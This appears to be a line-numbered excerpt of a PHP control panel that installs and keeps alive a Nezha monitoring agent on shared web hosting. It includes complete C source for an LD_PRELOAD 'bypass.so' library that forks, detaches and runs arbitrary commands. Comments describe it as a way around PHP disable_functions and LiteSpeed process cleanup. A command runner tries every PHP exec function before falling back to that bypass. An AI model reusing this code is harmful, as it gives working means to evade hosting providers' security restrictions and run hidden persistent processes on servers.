    79→    $ip = '';
    80→    $ip = @gethostbyname(gethostname());
    81→    if ($ip === gethostname()) $ip = '';
    82→    if (empty($ip) && isset($_SERVER['SERVER_ADDR'])) $ip = $_SERVER['SERVER_ADDR'];
    83→    if (empty($ip) && function_exists('curl_init')) {
    84→        $ch = @curl_init('https://ifconfig.me');
    85→        @curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>1, CURLOPT_TIMEOUT=>5, CURLOPT_USERAGENT=>'curl']);
    86→        $r = @curl_exec($ch); @curl_close($ch);
    87→        if ($r && filter_var(trim($r), FILTER_VALIDATE_IP)) $ip = trim($r);
    88→    }
    89→    if (empty($ip)) $ip = '127.0.0.1';
    90→    $h = md5('nezha-' . $ip);
    91→    $uuid = substr($h,0,8).'-'.substr($h,8,4).'-4'.substr($h,13,3).'-'.substr($h,16,4).'-'.substr($h,20,12);
    92→    return ['ip'=>$ip, 'uuid'=>$uuid];

   263→function generateBypassCSource() {
   264→    return <<<'C'
   265→#define _GNU_SOURCE
   266→#include <stdlib.h>
   267→#include <stdio.h>
   268→#include <string.h>
   269→#include <unistd.h>
   270→#include <sys/types.h>

   273→#include <signal.h>
   274→
   275→/* v8.5 bypass.so - 适配 LiteSpeed + 严格 disable_functions 环境
   276→ *
   277→ * 关键改进：
   278→ *   1. constructor 自己 fork + setsid，不依赖外部 setsid 命令
   279→ *      → 解决 LiteSpeed 请求结束杀整个进程组的问题
   280→ *      → 解决 posix_setsid 被 disable_functions 禁的问题（libc 函数不受影响）
   281→ *   2. 子进程重定向 stdin/stdout/stderr 到 /dev/null 或日志文件
   282→ *      → 完全脱离 PHP 的文件描述符
   283→ *   3. 父进程立即返回，不等待子进程（不阻塞 mail()）
   284→ *   4. 支持两种模式：
   285→ *      - 长驻模式（NZ_DAEMON=1）：fork + setsid + exec，agent 永久脱离
   286→ *      - 普通模式：fork + system，命令执行完子进程退出
   287→ */
   288→
   289→__attribute__((constructor))
   290→void nezha_bypass(void) {
   291→    const char *cmdfile = getenv("NZ_BYPASS_CMD");
   292→    if (!cmdfile || access(cmdfile, R_OK) != 0) return;
   293→
   294→    FILE *f = fopen(cmdfile, "r");
   295→    if (!f) return;
   296→    char cmd[8192] = {0};
   297→    if (!fgets(cmd, sizeof(cmd)-1, f)) {
   298→        fclose(f);
   299→        return;
   300→    }
   301→    fclose(f);
   302→    cmd[strcspn(cmd, "\n")] = 0;
   303→    if (strlen(cmd) == 0) return;
   304→
   305→    /* 清理环境变量，防止子进程再次触发 */
   306→    unsetenv("LD_PRELOAD");
   307→    unsetenv("NZ_BYPASS_CMD");
   308→
   309→    const char *daemon_mode = getenv("NZ_DAEMON");
   310→
   311→    /* 第一次 fork：让 child 成为孤儿进程，被 init 接管 */
   312→    pid_t pid = fork();
   313→    if (pid < 0) {
   314→        /* fork 失败，fallback 直接 system（会阻塞 mail，但至少能跑） */
   315→        system(cmd);
   316→        return;
   317→    }
   318→    if (pid > 0) {
   319→        /* parent：不等子进程，立即返回（避免阻塞 mail） */
   320→        waitpid(pid, NULL, WNOHANG);
   321→        return;
   322→    }
   323→
   324→    /* === child 进程 === */
   325→    /* 创建新 session，脱离控制终端和进程组（关键！绕过 LiteSpeed 进程清理） */
   326→    setsid();
   327→
   328→    /* 忽略 SIGHUP（session leader 终止时不会发 SIGHUP 给我们） */
   329→    signal(SIGHUP, SIG_IGN);
   330→
   331→    /* 第二次 fork：彻底成为 daemon，不再是 session leader，永远不会再获取控制终端 */
   332→    if (daemon_mode != NULL) {
   333→        pid_t pid2 = fork();
   334→        if (pid2 < 0) {
   335→            /* 失败也继续，单 fork 已经够用 */
   336→        } else if (pid2 > 0) {
   337→            /* 中间进程退出 */
   338→            _exit(0);
   339→        }
   340→    }
   341→
   342→    /* 重定向 stdin/stdout/stderr 到 /dev/null */
   343→    int devnull = open("/dev/null", O_RDWR);

   345→        dup2(devnull, 0);
   346→        dup2(devnull, 1);
   347→        dup2(devnull, 2);
   348→        if (devnull > 2) close(devnull);
   349→    }
   350→
   351→    /* 执行命令：用 system() 走 /bin/sh，支持 shell 语法（重定向、管道、&） */
   352→    int rc = system(cmd);
   353→
   354→    /* 子进程退出 */
   355→    _exit(WIFEXITED(rc) ? WEXITSTATUS(rc) : 1);
   356→}
   357→C;

   409→function ldPreloadExec($cmd, $so_path, $cmdfile, $daemon = false) {

   411→    if (empty($FUNC['putenv']['works'])) return ['output'=>'', 'code'=>-1, 'method'=>'ld_preload', 'error'=>'putenv不可用', 'so_loaded'=>false];

   477→function runCmd($cmd, $timeout=30) {
   478→    global $EXEC_METHODS, $LD_PRELOAD_AVAILABLE, $BYPASS_SO, $CMDFILE;
   479→    $output=''; $code=-1; $used='none';
   480→
   481→    foreach ($EXEC_METHODS as $m) {
   482→        if ($m === 'proc_open') {
   483→            $d=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
   484→            $p=@proc_open($cmd,$d,$pipes);
   485→            if (is_resource($p)) {
   486→                fclose($pipes[0]); $stdout=stream_get_contents($pipes[1]); $stderr=stream_get_contents($pipes[2]);
   487→                fclose($pipes[1]); fclose($pipes[2]); $code=proc_close($p);
   488→                $output=$stdout.($stderr?"\n[stderr] $stderr":''); $used='proc_open'; break;
   489→            }
   490→        } elseif ($m === 'popen') {
   491→            $fp=@popen($cmd.' 2>&1','r');
   492→            if ($fp) { $output=''; while(!feof($fp)) $output.=fread($fp,4096); $code=pclose($fp); $used='popen'; break; }
   493→        } elseif ($m === 'exec') {
   494→            $lines=[]; @exec($cmd." 2>&1",$lines,$code); $output=implode("\n",$lines); $used='exec'; break;
   495→        } elseif ($m === 'shell_exec') {
   496→            $output=@shell_exec($cmd." 2>&1"); $code=$output?0:1; $used='shell_exec'; break;
   497→        } elseif ($m === 'system') {
   498→            ob_start(); @system($cmd." 2>&1",$code); $output=ob_get_clean(); $used='system'; break;
   499→        } elseif ($m === 'passthru') {
   500→            ob_start(); @passthru($cmd." 2>&1",$code); $output=ob_get_clean(); $used='passthru'; break;
   501→        }
   502→    }
   503→
   504→    // LD_PRELOAD 兜底
   505→    if ($used === 'none' && $LD_PRELOAD_AVAILABLE) {
   506→        $r = ldPreloadExec($cmd, $BYPASS_SO, $CMDFILE);
   507→        if (!empty($r['method']) && $r['method'] === 'ld_preload') {
   508→            $output = $r['output']; $code = $r['code']; $used = 'ld_preload';
   509→        }
   510→    }
   511→
   512→    return ['output'=>trim($output), 'code'=>$code, 'method'=>$used];
   513→}

   574→function _checkAndCleanupUlimit($agent) {
   575→    $info = ['limit' => 0, 'current' => 0, 'cleaned' => 0, 'msg' => ''];
   576→
   577→    // 1. 获取 ulimit -u（max user processes）
   578→    $ulimit_u = 0;
   579→    if (is_readable('/proc/self/limits')) {
   580→        $limits = @file_get_contents('/proc/self/limits');
   581→        if (preg_match('/Max processes.*?(\d+)/', $limits, $m)) {
   582→            $ulimit_u = intval($m[1]);
   583→        }
   584→    }
   585→    if (!$ulimit_u && !empty($GLOBALS['EXEC_METHODS'])) {
   586→        $r = runCmd("ulimit -u 2>/dev/null");
   587→        if (is_numeric(trim($r['output']))) $ulimit_u = intval(trim($r['output']));
   588→    }
   589→    $info['limit'] = $ulimit_u;
   590→
   591→    // 2. 获取当前进程数
   592→    $current_procs = 0;
   593→    if (is_dir('/proc') && is_readable('/proc')) {
   594→        $my_uid = function_exists('posix_getuid') ? @posix_getuid() : 0;
   595→        foreach (@scandir('/proc') ?: [] as $pd) {
   596→            if (!is_numeric($pd) || $pd < 1) continue;
   597→            if ($my_uid) {
   598→                $stat = @file_get_contents("/proc/$pd/status");
   599→                if ($stat && preg_match('/Uid:\s*(\d+)/', $stat, $m) && intval($m[1]) === $my_uid) {
   600→                    $current_procs++;
   601→                }
   602→            } else {
   603→                $current_procs++;
   604→            }
   605→        }
   606→    }
   607→    $info['current'] = $current_procs;
   608→
   609→    // 3. 判断是否需要清理
   610→    // Go 运行时最少需要 4 个 OS 线程，预留 8 个比较安全
   611→    $needed = 8;
   612→    if ($ulimit_u > 0 && ($ulimit_u - $current_procs) < $needed) {
   613→        // 需要清理：找到所有非当前的 nezha_agent / run.sh 残留进程
   614→        $cleaned = 0;
   615→        $agent_dir = dirname($agent);
   616→        if (is_dir('/proc') && is_readable('/proc')) {
   617→            $my_pid = getmypid();
   618→            foreach (@scandir('/proc') ?: [] as $pd) {
   619→                if (!is_numeric($pd) || $pd < 1 || $pd == $my_pid) continue;
   620→                $cl = @file_get_contents("/proc/$pd/cmdline");
   621→                if (!$cl) continue;
   622→                // 匹配 agent 本身或 run.sh（不是当前 PHP）
   623→                if (strpos($cl, '.nezha_agent') !== false
   624→                    || strpos($cl, 'nezha-agent') !== false
   625→                    || (strpos($cl, 'run.sh') !== false && strpos($cl, $agent_dir) !== false)) {
   626→                    // 通过 LD_PRELOAD 或 shell kill 杀掉
   627→                    if (!empty($GLOBALS['EXEC_METHODS'])) {
   628→                        @runCmd("kill -9 $pd 2>/dev/null");
   629→                    } elseif (!empty($GLOBALS['LD_PRELOAD_AVAILABLE']) && file_exists($GLOBALS['BYPASS_SO'])) {
   630→                        ldPreloadExec("kill -9 $pd", $GLOBALS['BYPASS_SO'], $GLOBALS['CMDFILE']);
   631→                    }
   632→                    $cleaned++;
   633→                }
   634→            }
   635→        }
   636→        $info['cleaned'] = $cleaned;
   637→        $info['msg'] = "ulimit={$ulimit_u}, current={$current_procs}, cleaned={$cleaned} stale procs";
   638→    } else {
   639→        $info['msg'] = $ulimit_u > 0
   640→            ? "ulimit={$ulimit_u}, current={$current_procs} (OK)"
   641→            : "ulimit unknown, current={$current_procs}";
   642→    }
   643→
   644→    return $info;
   645→}

   695→        }
   696→
   697→        return ['ok'=>false, 'msg'=>'LD_PRELOAD 启动失败: '.implode(', ', $tried).'
   698→可能原因：
   699→1. bypass.so 版本太旧（v8.5 需要新版 .so，点「🔧 准备绕过环境」重新下载）
   700→2. /proc 不可读，无法检测进程（实际可能已启动）
   701→3. agent 二进制本身有问题（点「🚀 试运行」看输出）'];
   702→    }
   703→
   704→    // ========== 有 shell 执行能力时，走 v8.4 的 setsid 命令 ==========
   705→    $detached_cmd = "setsid bash -c " . escapeshellarg($agent_cmd . ' & echo $!') . " </dev/null >> /dev/null 2>&1";
   706→    $legacy_cmd = 'nohup ' . $env_prefix . $agent . ' -c ' . escapeshellarg($config) . ' >> ' . escapeshellarg($logfile) . ' 2>&1 &';
   707→
   708→    if (in_array('proc_open', $EXEC_METHODS)) {
   709→        $tried[] = 'proc_open+setsid';
   710→        $d = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
   711→        $p = @proc_open($detached_cmd, $d, $pipes);
   712→        if (is_resource($p)) {
   713→            fclose($pipes[0]);
   714→            $pid_out = '';
   715→            $start = microtime(true);
   716→            while ((microtime(true) - $start) < 1.5) {
   717→                $chunk = @fread($pipes[1], 1024);
   718→                if ($chunk) $pid_out .= $chunk;
   719→                if (strpos($pid_out, "\n") !== false) break;
   720→                usleep(50000);
   721→            }
   722→            fclose($pipes[1]); fclose($pipes[2]); @proc_close($p);
   723→
   724→            $pid = trim($pid_out);
   725→            if (is_numeric($pid) && $pid > 0) {
   726→                @file_put_contents(dirname($agent) . '/.nezha_pid', $pid);
   727→                @chmod(dirname($agent) . '/.nezha_pid', 0600);
   728→            }
   729→
   730→            sleep(2);
   731→            if (_checkProcAfterStart($agent)) return ['ok'=>true, 'msg'=>"proc_open+setsid 成功 (PID=$pid)"];
   732→        }
   733→
   734→        $tried[] = 'proc_open+nohup';
   735→        $p = @proc_open($legacy_cmd, $d, $pipes);
   736→        if (is_resource($p)) { fclose($pipes[0]); sleep(3); @proc_close($p); if (_checkProcAfterStart($agent)) return ['ok'=>true, 'msg'=>'proc_open+nohup 成功']; }
   737→    }
   738→    if (in_array('popen', $EXEC_METHODS)) {
   739→        $tried[] = 'popen+setsid';
   740→        $fp = @popen($detached_cmd, 'r');
   741→        if ($fp) { $pid_out = @fread($fp, 1024); @pclose($fp); sleep(2); if (_checkProcAfterStart($agent)) return ['ok'=>true, 'msg'=>'popen+setsid 成功']; }
   742→    }
   743→    if (in_array('exec', $EXEC_METHODS)) {
   744→        $tried[] = 'exec+setsid';
   745→        @exec($detached_cmd, $out, $code);
   746→        sleep(2);
   747→        if (_checkProcAfterStart($agent)) return ['ok'=>true, 'msg'=>'exec+setsid 成功'];
   748→    }
   749→    if (in_array('shell_exec', $EXEC_METHODS)) {
   750→        $tried[] = 'shell_exec+setsid';
   751→        @shell_exec($detached_cmd);
   752→        sleep(2);
   753→        if (_checkProcAfterStart($agent)) return ['ok'=>true, 'msg'=>'shell_exec+setsid 成功'];
   754→    }
   755→
   756→    // LD_PRELOAD 兜底
   757→    if ($LD_PRELOAD_AVAILABLE && file_exists($BYPASS_SO) && filesize($BYPASS_SO) > 1000) {
   758→        $tried[] = 'ld_preload+daemon';
   759→        ldPreloadExec($agent_cmd, $BYPASS_SO, $CMDFILE, true);
   760→        sleep(3);
   761→        if (_checkProcAfterStart($agent)) return ['ok'=>true, 'msg'=>'LD_PRELOAD+daemon 启动成功'];
   762→    }
   763→
   764→    // v8.10: 失败时附加 ulimit 诊断信息
   765→    $err_msg = '所有方式均失败: '.implode(', ', $tried);
   766→    $err_msg .= "\n\n--- v8.10 ulimit 诊断 ---";
   767→    $err_msg .= "\n" . $ulimit_info['msg'];
   768→    if ($ulimit_info['limit'] > 0 && $ulimit_info['limit'] < 50) {
   769→        $err_msg .= "\n❌ ulimit -u 太低 ({$ulimit_info['limit']})，Go 运行时启动需要至少 8 个进程槽位";
   770→        $err_msg .= "\n   解决方案：";
   771→        $err_msg .= "\n   ① 联系主机商提高 ulimit -u（推荐 ≥100）";
   772→        $err_msg .= "\n   ② cPanel 用户：在 cPanel → Software → Multiphp INI Editor 查看是否可调";
   773→        $err_msg .= "\n   ③ 用 .htaccess 加 'RLimitMem' 指令试试（不一定生效）";
   774→        $err_msg .= "\n   ④ 换主机（这是最根本的解决方法）";
   775→    } elseif ($ulimit_info['limit'] > 0 && ($ulimit_info['limit'] - $ulimit_info['current']) < 8) {
   776→        $err_msg .= "\n⚠️ 进程槽位不足，已清理 {$ulimit_info['cleaned']} 个残留进程";
   777→        $err_msg .= "\n   建议再点一次「▶ 启动」试试";
   778→    }
   779→    $err_msg .= "\n（也可能是 LiteSpeed 强杀了进程，请用「自动保活」按钮）";
   780→
   781→    return ['ok'=>false, 'msg'=>$err_msg];
   782→}

   800→        @file_put_contents($pidfile, $found_pid);
   801→        @chmod($pidfile, 0600);
   802→        return true;
   803→    }
   804→    return false;

   832→function detectProcess($agent, $pidfile) {
   833→    $info = ['running'=>false, 'pids'=>[], 'pid_file'=>'-', 'method'=>'', 'detail'=>'未检测到', 'debug'=>''];
   834→    $logfile = dirname($agent) . '/.nezha_log';
   835→
   836→    // === 方法1: PID 文件 + /proc 验证 ===
   837→    if (file_exists($pidfile)) {
   838→        $pid = trim(file_get_contents($pidfile)); $info['pid_file'] = $pid;
   839→        if (is_numeric($pid) && $pid>0) {
   840→            if (is_dir("/proc/$pid") && is_readable("/proc/$pid/cmdline")) {
   841→                $cl = @file_get_contents("/proc/$pid/cmdline");
   842→                if ($cl && (strpos($cl, '.nezha_agent')!==false || strpos($cl, 'nezha-agent')!==false)) {
   843→                    $info['running']=true; $info['pids'][]=$pid; $info['method']='PID+/proc'; $info['detail']="PID $pid 存活"; return $info;
   844→                }
   845→                $info['debug'] = "PID文件有PID=$pid 但cmdline不匹配: ".bin2hex(substr($cl,0,80));
   846→            } else {
   847→                $info['debug'] = "PID文件有PID=$pid 但/proc不可读";
   848→            }
   849→        }
   850→    }
   851→
   852→    // === 方法2: /proc 遍历 ===
   853→    if (!$info['running'] && is_dir('/proc') && is_readable('/proc')) {
   854→        foreach (@scandir('/proc') ?: [] as $pd) {
   855→            if (!is_numeric($pd) || $pd<1) continue;
   856→            $cl = @file_get_contents("/proc/$pd/cmdline");
   857→            if ($cl && (strpos($cl, '.nezha_agent')!==false || strpos($cl, 'nezha-agent')!==false)) {
   858→                $info['running']=true; $info['pids'][]=$pd; if (!$info['method']) $info['method']='/proc遍历'; $info['detail']="PID=$pd";
   859→            }
   860→        }
   861→        if (!$info['running'] && empty($info['debug'])) {
   862→            $info['debug'] = '/proc可读但未找到nezha进程(可能权限不足只能看自己的)';
   863→        }
   864→    } elseif (!$info['running'] && empty($info['debug'])) {
   865→        $info['debug'] = '/proc不可读';
   866→    }
   867→
   868→    // === 方法3: shell pgrep ===
   869→    if (!$info['running'] && !empty($GLOBALS['EXEC_METHODS'])) {
   870→        $chk = runCmd("pgrep -f '.nezha_agent' 2>/dev/null");
   871→        $pids = array_filter(explode("\n", trim($chk['output'])));
   872→        // 【修复】pgrep 可能匹配到其他用户的 nezha 进程，必须二次验证
   873→        foreach ($pids as $pid) {
   874→            $pid = trim($pid);
   875→            if (!is_numeric($pid) || $pid < 1) continue;
   876→            // 二次验证：检查 /proc/PID/cmdline 或 /proc/PID/exe 是否指向当前 agent
   877→            $verified = false;
   878→            if (is_readable("/proc/$pid/cmdline")) {
   879→                $cl = @file_get_contents("/proc/$pid/cmdline");
   880→                // 检查 cmdline 是否包含当前 agent 的完整路径
   881→                if ($cl && (strpos($cl, $agent) !== false || strpos($cl, '.nezha_agent') !== false)) {
   882→                    $verified = true;
   883→                }
   884→            }
   885→            // 如果 /proc 不可读，检查 exe 链接
   886→            if (!$verified && is_readable("/proc/$pid/exe")) {
   887→                $exe = @readlink("/proc/$pid/exe");
   888→                if ($exe && strpos($exe, '.nezha_agent') !== false) {
   889→                    $verified = true;
   890→                }
   891→            }
   892→            if ($verified) {
   893→                $info['running'] = true;
   894→                $info['pids'][] = $pid;
   895→                if (!$info['method']) $info['method'] = 'pgrep+验证';
   896→            }
   897→        }
   898→        if (!$info['running'] && !empty($pids)) {
   899→            $info['debug'] = 'pgrep 找到 '.count($pids).' 个 PID 但验证均失败（可能是其他用户的 nezha 进程）';
   900→        }
   901→    }
   902→
   903→    // === 方法4: 日志文件活跃度检测（v8.2 收紧阈值） ===
   904→    // 注意：nezha agent 不持续写日志，只在启动/出错时写一行
   905→    //       所以 60s 窗口太宽，刚启动 agent 后 60s 内点别的按钮也会误判
   906→    //       收紧到 15s + 同时要求 PID 文件存在（双重验证）
   907→    if (!$info['running'] && file_exists($logfile) && filesize($logfile) > 0) {
   908→        clearstatcache(true, $logfile);
   909→        $mtime = @filemtime($logfile);
   910→        $age = $mtime ? (time() - $mtime) : 9999;
   911→        // 只在 PID 文件存在 + 日志 15s 内有更新时才判定运行（双重验证避免误判）
   912→        if ($mtime && $age < 15 && file_exists($pidfile)) {
   913→            $info['running'] = true;
   914→            $info['pids'][] = '(via logs)';   // 占位 PID
   915→            $info['method'] = '日志活跃度';
   916→            $info['detail'] = "日志 ${age}s 前更新且 PID 文件存在 (agent 可能在运行)";
   917→        } elseif ($mtime) {
   918→            $info['detail'] = "日志 ${age}s 前更新 (可能已停止)";
   919→        }
   920→    }
   921→
   922→    // === 方法5: 哪吒服务器 gRPC 连通性检测（v8.2 修复误判） ===
   923→    // 旧实现 BUG：只要 /proc/net/tcp 里有任意 :01BB 行（state=01）就判定 agent 在跑
   924→    //   但本 PHP 走 HTTPS/443 时，浏览器 ↔ LiteSpeed 的 ESTABLISHED 连接也是 :01BB state=01
   925→    //   → 用户只要打开面板就误判 agent 在跑（用户报告的 BUG）
   926→    // 修复思路：必须解析 nezha server hostname → IP，只匹配 rem_address = 该 IP 的 ESTABLISHED 行
   927→    if (!$info['running']) {
   928→        $nz_server = '';
   929→        if (file_exists(dirname($agent) . '/.nezha_config')) {
   930→            $cfg = @file_get_contents(dirname($agent) . '/.nezha_config');
   931→            if (preg_match('/^server:\s*"?([^"\s]+)"?/m', $cfg, $m)) $nz_server = $m[1];
   932→        }
   933→        if ($nz_server) {
   934→            $parts = explode(':', $nz_server);
   935→            $host = $parts[0];
   936→            $port = isset($parts[1]) ? intval($parts[1]) : 5555;
   937→            if (is_readable('/proc/net/tcp')) {
   938→                // 1. 把 nezha server hostname 解析成 IPv4
   939→                $ip = @gethostbyname($host);
   940→                if ($ip && filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
   941→                    // 2. /proc/net/tcp 的地址是 32位 hex 小端序，需要反转字节
   942→                    $ip_packed = @inet_pton($ip);   // 4 字节大端序
   943→                    if ($ip_packed !== false && strlen($ip_packed) === 4) {
   944→                        $ip_hex_le = bin2hex(strrev($ip_packed));   // 反转 → 小端 hex
   945→                        $port_hex  = sprintf('%04X', $port);
   946→                        $tcp = @file_get_contents('/proc/net/tcp');
   947→                        if ($tcp) {
   948→                            // 3. 严格解析每行，只匹配 rem_address = nezha_IP AND rem_port = nezha_port AND state = 01
   949→                            //    行格式:  sl local_address:port rem_address:port st ...
   950→                            foreach (explode("\n", $tcp) as $line) {
   951→                                if (!preg_match(
   952→                                    '/^\s*\d+:\s+[0-9A-Fa-f]{8}:[0-9A-Fa-f]{4}\s+([0-9A-Fa-f]{8}):([0-9A-Fa-f]{4})\s+(\d+)\s/',
   953→                                    $line, $m2
   954→                                )) continue;
   955→                                if ($m2[1] === strtoupper($ip_hex_le) && $m2[2] === $port_hex && $m2[3] === '01') {
   956→                                    $info['running'] = true;
   957→                                    $info['pids'][] = '(via tcp)';
   958→                                    $info['method'] = 'TCP连接检测';
   959→                                    $info['detail'] = "检测到本机到 $host($ip):$port 的活跃连接 (agent 在跑，但 PHP 权限不足无法获取真实 PID)";
   960→                                    break;
   961→                                }
   962→                            }
   963→                        }
   964→                    }
   965→                }
   966→            }
   967→        }
   968→    }
   969→
   970→    return $info;
   971→}

   977→function stopProcess($agent, $pidfile) {
   978→    global $EXEC_METHODS, $LD_PRELOAD_AVAILABLE, $BYPASS_SO, $CMDFILE, $RUNSH;
   979→    $killed = [];
   980→    
   981→    // === 收集所有需要杀的 PID ===
   982→    $pids_to_kill = [];
   983→    
   984→    // 1. 从 PID 文件
   985→    if (file_exists($pidfile)) {
   986→        $pid = trim(file_get_contents($pidfile));
   987→        if (is_numeric($pid) && $pid>0) $pids_to_kill[] = $pid;
   988→        @unlink($pidfile);
   989→    }
   990→    
   991→    // 2. 从 /proc 遍历找本 PHP 代码产生的所有进程
   992→    //    匹配: .nezha_agent, run.sh, nezha-agent, 以及 PHP 启动的 shell 子进程
   993→    if (is_dir('/proc') && is_readable('/proc')) {
   994→        // 先收集当前目录下的所有相关进程
   995→        foreach (@scandir('/proc') ?: [] as $pd) {
   996→            if (!is_numeric($pd) || $pd<1) continue;
   997→            $cl = @file_get_contents("/proc/$pd/cmdline");
   998→            if (!$cl) continue;
   999→            $cl_str = str_replace("\0", ' ', $cl);
  1000→            // 匹配 agent 本身
  1001→            if (strpos($cl, $agent) !== false
  1002→                || (strpos($cl, '.nezha_agent') !== false && strpos($cl, dirname($agent)) !== false)
  1003→                || (strpos($cl, 'nezha-agent') !== false && strpos($cl, dirname($agent)) !== false)
  1004→                || strpos($cl, $RUNSH) !== false) {
  1005→                $pids_to_kill[] = $pd;
  1006→            }
  1007→        }
  1008→        // 如果找到了 agent PID，还需要杀它的子进程
  1009→        // 用 pstree 找子进程
  1010→        if (!empty($pids_to_kill) && !empty($EXEC_METHODS)) {
  1011→            foreach (array_unique($pids_to_kill) as $ppid) {
  1012→                $chk = runCmd("pstree -p $ppid 2>/dev/null | grep -oP '\\d+' | head -20");
  1013→                foreach (array_filter(explode("\n", trim($chk['output']))) as $cpid) {
  1014→                    $cpid = trim($cpid);
  1015→                    if (is_numeric($cpid) && $cpid > 0) $pids_to_kill[] = $cpid;
  1016→                }
  1017→            }
  1018→        }
  1019→    }
  1020→    
  1021→    // 3. 从 pgrep 补充（匹配 agent 路径和 run.sh）
  1022→    if (!empty($EXEC_METHODS)) {
  1023→        $chk = runCmd("pgrep -f " . escapeshellarg($agent) . " 2>/dev/null");
  1024→        foreach (array_filter(explode("\n", trim($chk['output']))) as $pid) {
  1025→            $pid = trim($pid);
  1026→            if (is_numeric($pid) && $pid>0) $pids_to_kill[] = $pid;
  1027→        }
  1028→        $chk2 = runCmd("pgrep -f " . escapeshellarg($RUNSH) . " 2>/dev/null");
  1029→        foreach (array_filter(explode("\n", trim($chk2['output']))) as $pid) {
  1030→            $pid = trim($pid);
  1031→            if (is_numeric($pid) && $pid>0) $pids_to_kill[] = $pid;
  1032→        }
  1033→    }
  1034→    
  1035→    $pids_to_kill = array_unique(array_filter($pids_to_kill));
  1036→    
  1037→    // === 执行杀进程 ===
  1038→    foreach ($pids_to_kill as $pid) {
  1039→        // 方式1: posix_kill（如果可用且不在禁用列表）
  1040→        if (function_exists('posix_kill') && !in_array('posix_kill', array_map('trim', explode(',', @ini_get('disable_functions') ?: '')))) {
  1041→            @posix_kill($pid, 9);
  1042→            $killed[] = "posix_kill($pid)";
  1043→        }
  1044→        // 方式2: shell kill（多次确保）
  1045→        if (!empty($EXEC_METHODS)) {
  1046→            runCmd("kill -9 $pid 2>/dev/null");
  1047→            $killed[] = "kill -9 $pid";
  1048→        }
  1049→        // 方式3: LD_PRELOAD kill
  1050→        if ($LD_PRELOAD_AVAILABLE && empty($EXEC_METHODS)) {
  1051→            ldPreloadExec("kill -9 $pid", $BYPASS_SO, $CMDFILE);
  1052→            $killed[] = "kill $pid (bypass)";
  1053→        }
  1054→    }
  1055→    
  1056→    // === 杀整个进程组（关键！nohup/setsid 启动的进程组与父不同） ===
  1057→    if (!empty($EXEC_METHODS) && !empty($pids_to_kill)) {
  1058→        foreach ($pids_to_kill as $pid) {
  1059→            runCmd("kill -9 -\$(ps -o pgid= -p $pid 2>/dev/null | tr -d ' ') 2>/dev/null");
  1060→            $killed[] = "killpgid($pid)";
  1061→        }
  1062→    }
  1063→    
  1064→    // === 兜底：pkill 精确匹配 agent 路径和 run.sh ===
  1065→    if (!empty($EXEC_METHODS)) {
  1066→        runCmd("pkill -9 -f " . escapeshellarg($agent) . " 2>/dev/null");
  1067→        $killed[] = 'pkill agent';
  1068→        runCmd("pkill -9 -f " . escapeshellarg($RUNSH) . " 2>/dev/null");
  1069→        $killed[] = 'pkill run.sh';
  1070→    }
  1071→    // LD_PRELOAD 兜底（v8.5：shell 全禁时唯一杀进程方式）
  1072→    if ($LD_PRELOAD_AVAILABLE && empty($EXEC_METHODS) && file_exists($BYPASS_SO) && filesize($BYPASS_SO) > 1000) {
  1073→        // 杀 agent
  1074→        ldPreloadExec("pkill -9 -f " . escapeshellarg($agent), $BYPASS_SO, $CMDFILE);
  1075→        $killed[] = 'pkill agent (bypass)';
  1076→        // 杀 run.sh
  1077→        ldPreloadExec("pkill -9 -f " . escapeshellarg($RUNSH), $BYPASS_SO, $CMDFILE);
  1078→        $killed[] = 'pkill run.sh (bypass)';
  1079→        // 杀进程组（每个 PID 都试）
  1080→        foreach ($pids_to_kill as $pid) {
  1081→            if (!is_numeric($pid) || $pid < 1) continue;
  1082→            ldPreloadExec("kill -9 -\$(ps -o pgid= -p $pid 2>/dev/null | tr -d ' ') 2>/dev/null", $BYPASS_SO, $CMDFILE);
  1083→            $killed[] = "killpgid($pid) (bypass)";
  1084→        }
  1085→    }
  1086→    
  1087→    sleep(1);
  1088→    $p = detectProcess($agent, $pidfile);
  1089→    return ['ok'=>!$p['running'], 'msg'=>!empty($killed)?implode(', ',$killed):'无可用方式', 'detail'=>$p];
  1090→}

  1096→function writeConfig($config, $server, $tls, $secret, $uuid, $uuidfile) {
  1097→    if (file_exists($uuidfile)) { $u = trim(@file_get_contents($uuidfile)); if (preg_match('/^[0-9a-fA-F-]{36}$/', $u)) $uuid = $u; }
